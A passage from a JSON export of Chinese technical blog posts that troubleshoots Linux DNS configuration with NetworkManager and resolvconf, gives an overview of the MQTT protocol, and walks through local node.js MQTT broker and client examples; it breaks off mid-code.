  "body": "<p>\n\u53d1\u73b0  <code>Firefox<\/code> \u7684\u72b6\u6001\u680f\u957f\u65f6\u95f4\u663e\u793a <code>Looking up www.xxxx.com ...<\/code> \uff0c\u5e94\u8be5\u662f\u6211\u7684\u7535\u8111\u7684 <code>DNS<\/code> \u914d\u7f6e\u51fa\u95ee\u9898\u4e86\u3002\n<\/p>\n\n<p>\n<code>\/etc\/resolv.conf<\/code> \u5185\u5bb9\u5982\u4e0b\uff1a\n<\/p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nsearch lan\nnameserver 8.8.8.8\nnameserver 192.168.111.1\n<\/pre>\n\n<p>\n<code>\/etc\/resolvconf.conf<\/code> \u5185\u5bb9\u5982\u4e0b\uff1a\n<\/p>\n\n<pre class=\"example\">\nresolv_conf=\/etc\/resolv.conf\nname_servers=8.8.8.8\n<\/pre>\n\n<p>\n\u6211\u914d\u7f6e\u7684\u662f\u4f7f\u7528\u9759\u6001DNS <code>8.8.8.8<\/code> \uff0c\u4f46\u662f <code>\/etc\/resolv.conf<\/code> \u6587\u4ef6\u5185\u5bb9\u591a\u51fa\u4e86\u4e24\u9879\uff0c\u6000\u7591\u662f <code>search lan<\/code> \u5f15\u8d77\u3002\n<\/p>\n\n<p>\n\u5f88\u591a\u7684\u7f51\u7edc\u7ba1\u7406\u5de5\u5177\u90fd\u4f1a\u53bb\u6539\u52a8 <code>\/etc\/resolv.conf<\/code> \u6587\u4ef6\uff0c\u5982 <code>pdnsd<\/code> <code>dnsmasq<\/code> <code>NetworkManager<\/code> \u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7981\u6b62 <code>NetworkManager<\/code> \u6539\u52a8 <code>\/etc\/resolv.conf<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u4fee\u6539 <code>\/etc\/NetworkManager\/NetworkManager.conf<\/code> \u914d\u7f6e\n\n<p>\n<code>dns=none<\/code>\n<\/p>\n<\/li>\n\n<li>\u91cd\u65b0\u8f7d\u5165 <code>systemd<\/code> \u914d\u7f6e\n\n<p>\n<code>sudo systemctl daemon-reload<\/code>\n<\/p>\n<\/li>\n\n<li>\u91cd\u542f <code>NetworkManager<\/code>\n\n<p>\n<code>sudo systemctl restart NetworkManager<\/code>\n<\/p>\n<\/li>\n\n<li>\u91cd\u65b0\u751f\u6210 <code>\/etc\/resolv.conf<\/code>\n\n<p>\n<code>sudo resolvconf -u<\/code>\n<\/p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nnameserver 8.8.8.8\n<\/pre>\n\n<p>\n\u73b0\u5728\u53ef\u4ee5\u6b63\u5e38\u4e0a\u7f51\u4e86\u3002\n<\/p>\n\n<p>\n\u4f46\u662f\u9759\u6001DNS <code>8.8.8.8<\/code> \u4e0d\u592a\u7a33\u5b9a\uff0c\u6700\u597d\u6362\u6210\u4f18\u5148\u4f7f\u7528DHCP\u5206\u914d\u7684\u672c\u5730DNS\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u4f7f\u7528DHCP\u5206\u914d\u7684\u672c\u5730DNS<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u64a4\u9500\u4e4b\u524d\u5bf9 <code>\/etc\/NetworkManager\/NetworkManager.conf<\/code> \u7684\u4fee\u6539\n\n<p>\n<code>dns=default<\/code>\n<\/p>\n<\/li>\n\n<li>\u53bb\u6389 <code>\/etc\/resolvconf.conf<\/code> \u914d\u7f6e\u7684\u9759\u6001DNS\n\n<pre class=\"example\">\nresolv_conf=\/etc\/resolv.conf\n#name_servers=8.8.8.8\n<\/pre>\n<\/li>\n\n<li>\u91cd\u65b0\u8f7d\u5165 <code>systemd<\/code> \u914d\u7f6e\n\n<p>\n<code>sudo systemctl daemon-reload<\/code>\n<\/p>\n<\/li>\n\n<li>\u91cd\u542f <code>NetworkManager<\/code>\n\n<p>\n<code>sudo systemctl restart NetworkManager<\/code>\n<\/p>\n<\/li>\n\n<li>\u91cd\u65b0\u751f\u6210 <code>\/etc\/resolv.conf<\/code>\n\n<p>\n<code>sudo resolvconf -u<\/code>\n<\/p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nnameserver 192.168.111.1\n<\/pre>\n\n<p>\n\u8fc7\u4e00\u4f1a\u513f <code>\/etc\/resolv.conf<\/code> \u5185\u5bb9\u81ea\u52a8\u88ab\u66f4\u65b0\n<\/p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nsearch lan\nnameserver 192.168.111.1\n<\/pre>\n\n<p>\n<code>search lan<\/code> \u53c8\u51fa\u73b0\u4e86\uff0c <code>NetworkManager<\/code> \u8c8c\u4f3c\u662f\u901a\u8fc7 <code>dhclient<\/code> \u5bf9 <code>\/etc\/resolv.conf<\/code> \u8fdb\u884c\u4fee\u6539\u7684\uff0c\n\u5177\u4f53\u6307\u4ee4\u53c2\u89c1 <code>\/sbin\/dhclient-script<\/code> \u3002\n<\/p>\n\n<p>\n\u4e0a\u7f51\u53c8\u5f88\u6d41\u7545\u4e86\uff0c\u770b\u6765\u4e4b\u524d\u4e0a\u7f51\u6162\u662f\u7531 <code>8.8.8.8<\/code> DNS\u670d\u52a1\u5668\u62bd\u98ce\u5f15\u8d77\uff0c\u4e0e <code>search lan<\/code> \u914d\u7f6e\u65e0\u5173\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https:\/\/wiki.archlinux.org\/index.php\/Resolv.conf#Preserve_DNS_settings\">resolv.conf - ArchWiki<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "mqtt\u534f\u8bae\u4e00\u77a5",
  "timestamp": "2016-01-05 11:16:00",
  "tags": [
    "network",
    "IoT"
  ],
  "body": "<blockquote>\n<p>\nIoT\u662fInternet of Things\u7684\u7f29\u5199\uff0c\u5b57\u9762\u7ffb\u8bd1\u662f\u201c\u7269\u4f53\u7ec4\u6210\u7684\u56e0\u7279\u7f51\u201d\uff0c\u51c6\u786e\u7684\u7ffb\u8bd1\u5e94\u8be5\u4e3a\u201c\u7269\u8054\u7f51\u201d\u3002\u7269\u8054\u7f51(Internet Of Things)\u53c8\u79f0\u4f20\u611f\u7f51\uff0c\u7b80\u8981\u8bb2\u5c31\u662f\u4e92\u8054\u7f51\u4ece\u4eba\u5411\u7269\u7684\u5ef6\u4f38\u3002\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"http:\/\/baike.baidu.com\/subview\/2831030\/13489169.htm\">IOT\uff08\u7269\u8054\u7f51\uff09_\u767e\u5ea6\u767e\u79d1<\/a>\n<\/p>\n\n\n<blockquote>\n<p>\nMQTT is a machine-to-machine (M2M)\/\"Internet of Things\" connectivity protocol. It was designed as an extremely lightweight publish\/subscribe messaging transport. It is useful for connections with remote locations where a small code footprint is required and\/or network bandwidth is at a premium. For example, it has been used in sensors communicating to a broker via satellite link, over occasional dial-up connections with healthcare providers, and in a range of home automation and small device scenarios. It is also ideal for mobile applications because of its small size, low power usage, minimised data packets, and efficient distribution of information to one or many receivers.\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"http:\/\/mqtt.org\/\">mqtt.org<\/a>\n<\/p>\n\n\n<blockquote>\n<p>\nMQTT\uff08Message Queuing Telemetry Transport\uff0c\u6d88\u606f\u961f\u5217\u9065\u6d4b\u4f20\u8f93\uff09\u662fIBM\u5f00\u53d1\u7684\u4e00\u4e2a\u5373\u65f6\u901a\u8baf\u534f\u8bae\uff0c\u6709\u53ef\u80fd\u6210\u4e3a\u7269\u8054\u7f51\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"http:\/\/baike.baidu.com\/view\/9956531.htm\">MQTT_\u767e\u5ea6\u767e\u79d1<\/a>\n<\/p>\n\n\n<blockquote>\n<p>\nMQTT is a lightweight messaging protocol that is based on publish\/subscribe pattern. Due to its low overhead and simplicity, this protocol is suitable for use in IoT and M2M applications. \n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"http:\/\/www.bitreactive.com\/mqtt-request-response\/\">Request\/Response Pattern Over MQTT | Bitreactive<\/a>\n<\/p>\n\n\n<blockquote>\n<p>\nMQTT - MQ Telemetry Transport\n<\/p>\n\n<p>\n\u8f7b\u91cf\u7ea7\u7684 Machine-to-Machine \u901a\u4fe1\u534f\u8bae\u3002\nPublish\/Subscribe\u6a21\u5f0f\u3002\n\u57fa\u4e8eTCP\/IP\u3002\n\u652f\u6301QoS\u3002\n\u9002\u5408\u4e8e\u4f4e\u5e26\u5bbd\u3001\u4e0d\u53ef\u9760\u8fde\u63a5\u3001\u5d4c\u5165\u5f0f\u8bbe\u5907\u3001CPU\u5185\u5b58\u8d44\u6e90\u7d27\u5f20\u3002\n\u662f\u4e00\u79cd\u6bd4\u8f83\u4e0d\u9519\u7684Android\u6d88\u606f\u63a8\u9001\u65b9\u6848\u3002\nFacebookMessenger\u91c7\u7528\u4e86MQTT\u3002\nMQTT\u6709\u53ef\u80fd\u6210\u4e3a\u7269\u8054\u7f51\u7684\u91cd\u8981\u534f\u8bae\u3002\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"http:\/\/www.cnblogs.com\/caca\/p\/mqtt.html\">MQTT\u534f\u8bae\u7b80\u8bb0 - cacard - \u535a\u5ba2\u56ed<\/a>\n<\/p>\n\n<blockquote>\n<p>\nWhy MQTT?\n<\/p>\n\n<p>\nIt is a publish\/subscribe protocol\nIt has Multiple Quality of Service levels (QOS)\nIt has at-least-once and exactly-once semantics\nIt has a low overhead (2 bytes at minimum)\nIt supports offline messaging\nIt retains messages, like a key\/value store\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"http:\/\/thejackalofjavascript.com\/getting-started-mqtt\/\">Getting started with MQTT | The Jackal of Javascript<\/a>\n<\/p>\n\n\n<p>\n<span class=\"underline\">\u7b80\u8a00\u4e4b\uff0c <code>mqtt<\/code> \u5c31\u662f\u7b80\u5355\u9ad8\u6548\u57fa\u4e8e <code>\u53d1\u5e03\/\u8ba2\u9605<\/code> \u7684 <code>\u6d88\u606f\u4f20\u8f93\u534f\u8bae<\/code> \uff0c\u4e3b\u8981\u7528\u4e8e\u8d44\u6e90\u53d7\u9650\u8bbe\u5907\uff08\u5982\uff1a\u4f20\u611f\u5668\u3001\u624b\u673a\u7b49\uff09\u4e0e\u670d\u52a1\u5668\u95f4\u6709\u4fdd\u969c\u5730\u8fdb\u884c\u6d88\u606f\u6216\u4e8b\u4ef6\u63a8\u9001\u3002<\/span>\n<\/p>\n\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u6709\u4e00\u4e9b\u4eba\uff08\u6216\u9879\u76ee\uff09\u5728\u5c1d\u8bd5\u5c06 <code>mqtt<\/code> \u6269\u5c55\u5230\u5176\u5b83\u7528\u9014<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<dl class=\"org-dl\">\n<dt> \u8bf7\u6c42\/\u54cd\u5e94\u6a21\u578b\uff08Request\/Response\uff09 <\/dt><dd><a href=\"http:\/\/www.bitreactive.com\/mqtt-request-response\/\">Request\/Response Pattern Over MQTT | Bitreactive<\/a>\n<\/dd>\n<\/dl>\n\n\n<dl class=\"org-dl\">\n<dt> \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09 <\/dt><dd><a href=\"https:\/\/github.com\/wolfeidau\/mqtt-rpc\">wolfeidau\/mqtt-rpc<\/a>\n<\/dd>\n<\/dl>\n\n\n<dl class=\"org-dl\">\n<dt> \u5305\u88f9WEB\u670d\u52a1\uff08REST\uff09 <\/dt><dd><a href=\"http:\/\/bytecontinnum.com\/2014\/12\/consuming-mobile-apis-with-mqtt-reqres-pattern\/\">REST over MQTT for Constrained Devices\/Mobiles | Prithiviraj Damodaran<\/a>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">IoT\u9886\u57df\u7684\u5176\u5b83\u7ade\u4e89\u5bf9\u624b<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https:\/\/tools.ietf.org\/html\/rfc7252\">CoAP<\/a> <\/dt><dd>Constrained Applications Protocol\n\n<p>\n\u57fa\u4e8e <code>UDP<\/code> \u534f\u8bae\uff0c\u7b80\u5316\u7248\u7684 <a href=\"https:\/\/tools.ietf.org\/html\/draft-ietf-httpbis-http2\">HTTP\/2<\/a> \u3002\n<\/p>\n\n<blockquote>\n<p>\nThe Constrained Application Protocol (CoAP) is a specialized web transfer protocol for use with constrained nodes and constrained networks in the Internet of Things.\nThe protocol is designed for machine-to-machine (M2M) applications such as smart energy and building automation.\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea  <a href=\"http:\/\/coap.technology\/\">CoAP \u2014 Constrained Application Protocol<\/a>\n<\/p>\n<\/dd>\n<\/dl>\n\n\n<dl class=\"org-dl\">\n<dt> <a href=\"https:\/\/tools.ietf.org\/html\/draft-ietf-httpbis-http2\">HTTP\/2<\/a> <\/dt><dd>HTTP\/2 (originally named HTTP\/2.0) is the second major version of the HTTP network protocol used by the World Wide Web\n\n<p>\n<a href=\"http:\/\/timkellogg.me\/blog\/2015\/02\/20\/can-http2-replace-mqtt\/\">Can HTTP\/2 Replace MQTT? - Tim Kellogg<\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/www.limmat.co\/2015\/02\/18\/http-2-the-new-iot-protocol\/\">HTTP\/2 - The New IoT Protocol?<\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/robbysimpson.com\/2015\/01\/26\/http2-and-the-internet-of-things\/\">HTTP\/2 and the Internet of Things<\/a>\n<\/p>\n\n<p>\n<a href=\"https:\/\/systembash.com\/mqtt-vs-websockets-vs-http2-the-best-iot-messaging-protocol\/\">MQTT vs Websockets vs HTTP\/2: The Best IoT Messaging Protocol?<\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/webofthings.org\/2015\/10\/25\/http2-for-internet-of-things-1\/\">What\u2019s in HTTP\/2 for the Internet of Things? 1\/2 | Web of Things<\/a>\n<\/p>\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u4e2a\u4eba\u603b\u7ed3<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https:\/\/tools.ietf.org\/html\/draft-ietf-httpbis-http2\">HTTP\/2<\/a> \u505a\u4e3a\u4e00\u79cd\u901a\u7528\u7684\u5e94\u7528\u5c42\u534f\u8bae\uff0c\u7531\u4e8e\u88ab\u5e7f\u6cdb\u90e8\u7f72\uff0c\u6709\u7740\u5929\u7136\u7684\u4f18\u52bf\uff0c\u4f46\u662f <code>mqtt<\/code> \u5e26\u6765\u7684 <code>Machine-To-Machine<\/code> \u3001 <code>offline<\/code> \u3001 <code>bridge<\/code>  \u6d88\u606f\u4f20\u8f93\uff0c\u73b0\u5728\u5c31\u53ef\u4ee5\u5e94\u7528\u5230\u4ea7\u54c1\u4e2d\u3002\n<\/p>\n\n<p>\n\u6216\u8bb8\u5c06\u6765\u6709\u4e00\u5929\u4f1a\u51fa\u73b0\u6784\u5efa\u4e8e <a href=\"https:\/\/tools.ietf.org\/html\/draft-ietf-httpbis-http2\">HTTP\/2<\/a> \u4e0a\u7684\u7c7b <code>mqtt<\/code> \u89e3\u51b3\u65b9\u6848\uff0c\u5b83\u80fd\u591f\u8fd0\u884c\u5728\u7edd\u5927\u591a\u6570\u7684\u8d44\u6e90\u5185\u9650\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e0a\uff0c\u5728\u8fd9\u4e4b\u524d <code>mqtt<\/code> \u4e4b\u7c7b\u7684\u6210\u719f\u7684\u5e94\u7528\u5c42\u534f\u8bae\u4f1a\u6709\u4e00\u5e2d\u4e4b\u5730\uff0c\u7279\u522b\u662f\u5728\u5b83\u5b8c\u7f8e\u5951\u5408\u4f60\u7684\u5e94\u7528\u7684\u60c5\u51b5\u4e0b\u3002\n<\/p>\n\n<p>\n\u505a\u4e3a\u4e00\u4e2a\u5f00\u53d1\u8005\uff0c\u4e0e\u5176\u5750\u7b49\u5b8c\u7f8e\u7684\u89e3\u51b3\u65b9\u6848\u51fa\u73b0\uff0c\u8fd8\u4e0d\u5982\u7acb\u5373\u5f00\u59cb\u5b66\u4e60 <code>mqtt<\/code> \uff0c\u5e94\u7528 <code>mqtt<\/code> \uff0c\u4ece <code>mqtt<\/code> \u4e2d\u5b66\u5230\u534f\u8bae\u8bbe\u8ba1\u7684\u7ecf\u9a8c\u4e0e\u6280\u672f\uff0c\u4ee5\u81f3\u6210\u4e3a\u5b9e\u73b0\u6784\u5efa\u4e8e <a href=\"https:\/\/tools.ietf.org\/html\/draft-ietf-httpbis-http2\">HTTP\/2<\/a> \u4e0a\u7684\u7c7b <code>mqtt<\/code> \u89e3\u51b3\u65b9\u6848\u7684\u90a3\u4e2a\u4eba\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "node.js\u4e0b\u8fdb\u884cmqtt\u5b9e\u8df5",
  "timestamp": "2016-02-21 13:13:00",
  "tags": [
    "network",
    "IoT",
    "node"
  ],
  "body": "<p>\n\u901a\u8fc7 mqtt \u53ef\u4ee5\u5c06\u8bbe\u5907\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u80fd\u591f\u5b9e\u73b0\u5c06\u6d88\u606f\uff08\u53ef\u80fd\u6765\u81ea\u670d\u52a1\u5668\u4e5f\u53ef\u80fd\u6765\u81ea\u5176\u5b83\u8bbe\u5907\uff09\u63a8\u9001\u5230\u8bbe\u5907\uff0c\u5982\u679c\u8bbe\u5907\u79bb\u7ebf\uff0c\n\u670d\u52a1\u5668\u53ef\u4ee5\u6682\u5b58\u6d88\u606f\uff0c\u5728\u8bbe\u5907\u4e0a\u7ebf\u65f6\u518d\u63a8\u9001\uff0c\u6709\u4e00\u4e9b\u7279\u6027\u5f88\u5173\u952e\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>offline\n\n<p>\n\u5141\u8bb8\u8bbe\u5907\u6682\u65f6\u79bb\u7ebf\u3002\n<\/p>\n\n<p>\n\u5373\u4f7f\u662f\u4f7f\u7528\u56fa\u5b9a\u5bbd\u5e26\uff0c\u6709\u4e9b\u7528\u6237\u4e5f\u4f1a\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u65e0\u6cd5\u4fdd\u6301\u7a33\u5b9a\u7684\u957f\u8fde\u63a5\uff0c\u53ef\u80fd\u662f\u4e0a\u7ea7\u8def\u7531\u8bbe\u5907\u6709\u9650\u5236\uff0c\u6216\u8005\u662f\u5e26\u5bbd\u88ab\u5176\u5b83\u5e94\u7528\u62a2\u5360\u800c\u5bfc\u81f4\u957f\u8fde\u63a5\u4e0d\u7a33\u5b9a\u3002\n\u5c06\u8bbe\u5907\u7684\u5728\u7ebf\u72b6\u6001\u4e0e TCP \u957f\u8fde\u63a5\u72b6\u6001\u8026\u5408\u5728\u4e00\u8d77\u662f\u4e0d\u660e\u667a\u7684\u3002\n<\/p>\n<\/li>\n\n<li>bridge\n\n<p>\n\u8bbe\u5907\u8fde\u63a5\u5728\u4e0d\u540c\u7684 broker \u4e0a\uff0c\u901a\u8fc7 bridge \u5b9e\u73b0\u4e92\u901a\u3002\n<\/p>\n\n<p>\n\u652f\u6301\u51e0\u4e07\u53f0\u8bbe\u5907\u5728\u7ebf\uff0c\u4f30\u8ba1\u4e00\u53f0 broker \u5c31\u591f\u4e86\uff0c\u4f46\u662f\u4e00\u65e6\u8fbe\u5230\u6570\u5341\u4e07\u3001\u767e\u4e07\u751a\u81f3\u4e0a\u4ebf\uff0c\u80af\u5b9a\u9700\u8981\u642d\u5efa broker \u96c6\u7fa4\uff0c\u53c2\u89c1 <a href=\"http:\/\/www.kegel.com\/c10k.html\">The C10K problem<\/a>\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u7b80\u5355\u8d77\u89c1\uff0c node.js \u670d\u52a1\u5668\u7aef\u4f7f\u7528 <a href=\"https:\/\/github.com\/mcollina\/mosca\">mosca<\/a>\uff0c \u5ba2\u6237\u7aef\u4f7f\u7528 <a href=\"https:\/\/github.com\/mqttjs\/MQTT.js\">MQTT.js<\/a> \uff0c\u7531\u4e8e <a href=\"https:\/\/github.com\/mcollina\/mosca\">mosca<\/a> \u4e0d\u652f\u6301 bridge\uff0c\u672c\u6587\u4e0d\u6d89\u53ca bridge \u7279\u6027\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u901a\u4fe1<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u5ba2\u6237\u7aef\u901a\u8fc7\u670d\u52a1\u5668\u7ed9\u81ea\u5df2\u53d1\u4e2a\u6d88\u606f\n\n<p>\n<code>server.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mosca<\/span> = require(<span style=\"color: #66cccc;\">'mosca'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">settings<\/span> = {\n<span style=\"background-color: #515151;\"> <\/span>   port: 1883\n};\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">server<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">mosca.Server<\/span>(settings);\nserver.on(<span style=\"color: #66cccc;\">'ready'<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'mosca server running'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'clientConnected'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'client('<\/span> + client.id + <span style=\"color: #66cccc;\">') connected'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'published'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">packet<\/span>, <span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'client('<\/span> + (client ? client.id : <span style=\"color: #66cccc;\">'internal'<\/span>) + <span style=\"color: #66cccc;\">') published top<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ic('<\/span><span style=\"text-decoration: underline;\"> + packet.topic + <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'): '<\/span><span style=\"text-decoration: underline;\"> + packet.payload);<\/span>\n}).on(<span style=\"color: #66cccc;\">'subscribed'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'client('<\/span> + client.id + <span style=\"color: #66cccc;\">') subscribed topic('<\/span> + topic + <span style=\"color: #66cccc;\">')'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'unsubscribed'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'client('<\/span> + client.id + <span style=\"color: #66cccc;\">') unsubscribed topic('<\/span> + topic + <span style=\"color: #66cccc;\">')'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'clientDisconnecting'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'client('<\/span> + client.id + <span style=\"color: #66cccc;\">') disconnecting'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'clientDisconnected'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'client('<\/span> + client.id + <span style=\"color: #66cccc;\">') disconnected'<\/span>);\n});\n<\/pre>\n<\/div>\n\n<p>\n<code>client.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mqtt<\/span> = require(<span style=\"color: #66cccc;\">'mqtt'<\/span>);\n\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">client<\/span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt:\/\/127.0.0.1:1883'<\/span>);\nclient.on(<span style=\"color: #66cccc;\">'connect'<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   client.subscribe(<span style=\"color: #66cccc;\">'presence'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   client.publish(<span style=\"color: #66cccc;\">'presence'<\/span>, <span style=\"color: #66cccc;\">'a message from myself'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'message'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(topic + <span style=\"color: #66cccc;\">': '<\/span> + message.toString());\n<span style=\"background-color: #515151;\"> <\/span>   client.end();\n});\n<\/pre>\n<\/div>\n\n<p>\n\u8fd0\u884c <code>server.js<\/code>\n<\/p>\n<pre class=\"example\">\n$ node server.js\nmosca server running\nclient(mqttjs_a423c0af) connected\nclient(internal) published topic($SYS\/41TXEHPDe\/new\/clients): mqttjs_a423c0af\nclient(mqttjs_a423c0af) subscribed topic(presence)\nclient(internal) published topic($SYS\/41TXEHPDe\/new\/subscribes): {\"clientId\":\"mqttjs_a423c0af\",\"topic\":\"presence\"}\nclient(mqttjs_a423c0af) published topic(presence): a message from myself\nclient(mqttjs_a423c0af) unsubscribed topic(presence)\nclient(mqttjs_a423c0af) disconnected\nclient(internal) published topic($SYS\/41TXEHPDe\/new\/unsubscribes): {\"clientId\":\"mqttjs_a423c0af\",\"topic\":\"presence\"}\nclient(internal) published topic($SYS\/41TXEHPDe\/disconnect\/clients): mqttjs_a423c0af\n<\/pre>\n\n<p>\n\u8fd0\u884c <code>client.js<\/code>\n<\/p>\n<pre class=\"example\">\n$ node client.js\npresence: a message from myself\n$\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5ba2\u6237\u7aef\u4e0e\u5ba2\u6237\u7aef\u901a\u4fe1<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u5ba2\u6237\u7aef\u53d1\u9001\u6d88\u606f\u7ed9\u53e6\u4e00\u4e2a\u5ba2\u6237\u7aef\n\n<p>\n\u4e0b\u9762\u7684\u4f8b\u5b50\u6f14\u793a\u4e86\u5ba2\u6237\u7aef\u901a\u8fc7\u7ea6\u5b9a\u7684 <code>topic<\/code> \u4e92\u76f8\u901a\u4fe1\u3002\n<\/p>\n\n<p>\n<code>client_sub.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mqtt<\/span> = require(<span style=\"color: #66cccc;\">'mqtt'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">client<\/span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt:\/\/127.0.0.1:1883'<\/span>);\nclient.on(<span style=\"color: #66cccc;\">'connect'<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   client.publish(<span style=\"color: #66cccc;\">'sub'<\/span>, <span style=\"color: #66cccc;\">'message from pub'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'message'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(topic + <span style=\"color: #66cccc;\">': '<\/span> + message.toString());\n<span style=\"background-color: #515151;\"> <\/span>   client.end();\n});\n<\/pre>\n<\/div>\n\n<p>\n<code>client_pub.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mqtt<\/span> = require(<span style=\"color: #66cccc;\">'mqtt'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">client<\/span> = 